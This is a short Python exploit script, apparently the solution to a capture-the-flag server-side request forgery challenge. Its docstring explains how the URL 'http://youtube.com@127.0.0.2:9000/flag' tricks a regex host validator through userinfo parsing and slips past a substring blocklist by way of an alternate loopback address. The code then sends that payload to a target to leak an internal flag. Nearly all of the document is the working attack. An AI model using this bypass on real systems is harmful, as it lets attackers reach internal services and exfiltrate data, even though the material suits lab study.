#!/usr/bin/env python3
"""Hard: youtube host allowlist + substring blocklist + resolve/deny-private.

The validator pulls the host out with a regex that stops at '@', so it checks
the userinfo ('youtube.com') while requests connects to the host *after* the
'@'. Chain that parser confusion with a non-literal loopback encoding so the
substring blocklist doesn't catch it either. ('youtube' in the URL also
satisfies the global gate.)

    http://youtube.com@127.0.0.2:9000/flag   -> validator sees youtube.com,
                                                request goes to 127.0.0.2:9000
"""
import sys
from exploit import leak, report

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5003"
report(leak(BASE, "http://youtube.com@127.0.0.2:9000/flag"))
